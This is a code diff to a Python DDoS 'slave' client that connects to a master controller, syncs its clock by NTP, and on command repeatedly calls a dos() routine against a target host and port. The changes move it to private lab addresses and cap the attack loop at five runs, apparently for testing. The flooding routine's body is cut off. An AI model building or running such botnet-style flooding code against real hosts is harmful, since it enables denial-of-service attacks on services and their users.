@@ -3,6 +3,12 @@ import time, os, sys, string, ntplib
 from socket import *  #importing the socket library for network connections
 from time import ctime
 
+##Setting up variables
+SERVER_HOST = '10.1.1.50'
+SERVER_PORT = 8080
+MS_LISTEN_HOST = '10.1.1.250'
+MS_LISTEN_PORT = 8081
+
 class Slave():
     def __init__(self, host, port, sock=None):
         print("DDoS mode loaded")
@@ -15,11 +21,11 @@ class Slave():
 
         # get ntp times
         ntpc = ntplib.NTPClient()
-        ntp_res = ntpc.request('europe.pool.ntp.org', version=3)
+        ntp_res = ntpc.request('10.1.1.50', version=3)
 
         # connect to master
-        self.masterHost = 'localhost'
-        self.masterPort = 8081
+        self.masterHost = MS_LISTEN_HOST
+        self.masterPort = MS_LISTEN_PORT
         self.sockMaster = socket(AF_INET, SOCK_STREAM)
         self.sockMaster.connect((self.masterHost, self.masterPort))
         self.sockMaster.send('Slave offset is: {0}'.format(ntp_res.offset))
@@ -33,8 +39,8 @@ class Slave():
               self.doTheDos(host, int(port), float(offset))
 
     def doTheDos(self, host, port, offset):
-        while 1:
-            self.dos(host, port)
+        for _ in range(0, 5):
+          self.dos(host, port)
 
     def dos(self, host, port):
         try:
